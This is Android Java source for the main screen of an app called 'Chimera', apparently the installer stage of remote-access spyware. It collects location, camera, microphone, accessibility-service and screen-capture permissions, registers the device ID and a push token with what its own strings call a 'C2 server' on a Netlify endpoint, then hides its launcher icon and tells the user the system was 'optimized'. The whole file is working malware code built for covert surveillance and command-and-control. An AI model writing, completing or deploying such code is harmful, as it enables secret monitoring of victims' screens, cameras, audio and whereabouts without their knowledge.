package com.chimera;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import androidx.activity.result.ActivityResult;
import androidx.activity.result.ActivityResultCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.firebase.messaging.FirebaseMessaging;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final int PERMISSIONS_REQUEST_CODE = 101;
    private static final String NETLIFY_REGISTER_URL = "https://chimeradmin.netlify.app/.netlify/functions/register-device";

    private TextView tvCheckPermissions;
    private TextView tvCheckAccessibility;
    private TextView tvCheckProjection; // New Checklist Item
    private Button btnFinalize;
    private RequestQueue requestQueue;

    // --- NEW: MediaProjection Permission Handling ---
    public static Intent projectionIntent = null;
    public static int projectionResultCode = 0;
    private ActivityResultLauncher<Intent> projectionLauncher;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        requestQueue = Volley.newRequestQueue(this);
        tvCheckPermissions = findViewById(R.id.tvCheckPermissions);
        tvCheckAccessibility = findViewById(R.id.tvCheckAccessibility);
        tvCheckProjection = findViewById(R.id.tvCheckProjection); // Initialize new TextView
        btnFinalize = findViewById(R.id.btnFinalize);

        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        ((TextView)findViewById(R.id.tvDeviceInfo)).setText("Device ID: " + deviceId);

        tvCheckPermissions.setOnClickListener(v -> requestAppPermissions());
        tvCheckAccessibility.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
        tvCheckProjection.setOnClickListener(v -> startProjectionRequest());
        btnFinalize.setOnClickListener(v -> beginActivationSequence());
        
        // Register the launcher for the MediaProjection permission result
        projectionLauncher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == Activity.RESULT_OK) {
                    projectionResultCode = result.getResultCode();
                    projectionIntent = result.getData();
                    Log.i(TAG, "MediaProjection permission GRANTED.");
                } else {
                    Log.w(TAG, "MediaProjection permission DENIED.");
                }
                checkSystemState(); // Re-check state after result
            });
    }

    private void startProjectionRequest() {
        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        projectionLauncher.launch(manager.createScreenCaptureIntent());
    }

    @Override
    protected void onResume() {
        super.onResume();
        checkSystemState();
    }

    private void checkSystemState() {
        boolean permsGranted = arePermissionsGranted();
        boolean accessibilityEnabled = isAccessibilityServiceEnabled();
        boolean projectionGranted = (projectionIntent != null);

        updateChecklistItem(tvCheckPermissions, "Core Permissions", permsGranted);
        updateChecklistItem(tvCheckAccessibility, "System Overlay Service", accessibilityEnabled);
        updateChecklistItem(tvCheckProjection, "Screen Capture Service", projectionGranted);

        if (permsGranted && accessibilityEnabled && projectionGranted) {
            btnFinalize.setEnabled(true);
            btnFinalize.setBackgroundColor(Color.parseColor("#0088CC"));
            btnFinalize.setTextColor(Color.WHITE);
        } else {
            btnFinalize.setEnabled(false);
            btnFinalize.setBackgroundColor(Color.parseColor("#444444"));
            btnFinalize.setTextColor(Color.parseColor("#888888"));
        }
    }

    // ... (arePermissionsGranted, isAccessibilityServiceEnabled, updateChecklistItem, requestAppPermissions methods are unchanged)
    private String[] getRequiredPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
        permissions.add(android.Manifest.permission.CAMERA);
        permissions.add(android.Manifest.permission.RECORD_AUDIO);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(android.Manifest.permission.POST_NOTIFICATIONS);
        }
        return permissions.toArray(new String[0]);
    }

    private boolean arePermissionsGranted() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true;
        for (String permission : getRequiredPermissions()) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    private boolean isAccessibilityServiceEnabled() {
        ComponentName expectedComp = new ComponentName(this, CoreService.class);
        String enabledServices = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (enabledServices == null) return false;
        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
        colonSplitter.setString(enabledServices);
        while (colonSplitter.hasNext()) {
            ComponentName enabledComp = ComponentName.unflattenFromString(colonSplitter.next());
            if (expectedComp.equals(enabledComp)) return true;
        }
        return false;
    }

    private void updateChecklistItem(TextView textView, String text, boolean isChecked) {
        String prefix = isChecked ? "[✅] " : "[⏳] ";
        int color = isChecked ? Color.GREEN : Color.YELLOW;
        textView.setText(prefix + text);
        textView.setTextColor(color);
    }

    private void requestAppPermissions() {
        List<String> neededPermissions = new ArrayList<>();
        for (String permission : getRequiredPermissions()) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                neededPermissions.add(permission);
            }
        }
        if (!neededPermissions.isEmpty()) {
            ActivityCompat.requestPermissions(this, neededPermissions.toArray(new String[0]), PERMISSIONS_REQUEST_CODE);
        }
    }
    // ... (beginActivationSequence, getTokenAndRegister, registerDeviceWithNetlify, goDark methods are unchanged)
    private void beginActivationSequence() {
        btnFinalize.setEnabled(false);
        btnFinalize.setText("Activating...");
        ((TextView)findViewById(R.id.tvDeviceInfo)).append("\n\nStatus: Fetching C2 token...");
        getTokenAndRegister();
    }

    private void getTokenAndRegister() {
        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
            if (!task.isSuccessful()) {
                Log.w(TAG, "FCM token failed", task.getException());
                ((TextView)findViewById(R.id.tvDeviceInfo)).append("\nStatus: FAILED. Check network.");
                btnFinalize.setEnabled(true);
                btnFinalize.setText("Retry Activation");
                return;
            }
            String token = task.getResult();
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            registerDeviceWithNetlify(deviceId, token);
        });
    }

    private void registerDeviceWithNetlify(String deviceId, String token) {
        ((TextView)findViewById(R.id.tvDeviceInfo)).append("\nStatus: Registering with C2 server...");
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("token", token);
        } catch (JSONException e) {
            ((TextView)findViewById(R.id.tvDeviceInfo)).append("\nStatus: FAILED. Internal error.");
            return;
        }
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, NETLIFY_REGISTER_URL, postData,
                response -> {
                    ((TextView)findViewById(R.id.tvDeviceInfo)).append("\nStatus: ✅ Registration Complete.");
                    goDark();
                },
                error -> {
                    ((TextView)findViewById(R.id.tvDeviceInfo)).append("\nStatus: ❌ FAILED. C2 server rejected connection.");
                    btnFinalize.setEnabled(true);
                    btnFinalize.setText("Retry Activation");
                }
        );
        requestQueue.add(request);
    }

    private void goDark() {
        btnFinalize.setText("Activation Complete");
        ((TextView)findViewById(R.id.tvDeviceInfo)).append("\n\nSystem Optimized. This utility can now be closed.");
        Intent intent = new Intent(this, CoreService.class);
        intent.setAction("com.chimera.action.TOGGLE_ICON");
        intent.putExtra("show", "false");
        startService(intent);
        new Handler(Looper.getMainLooper()).postDelayed(this::finish, 3000);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }
}
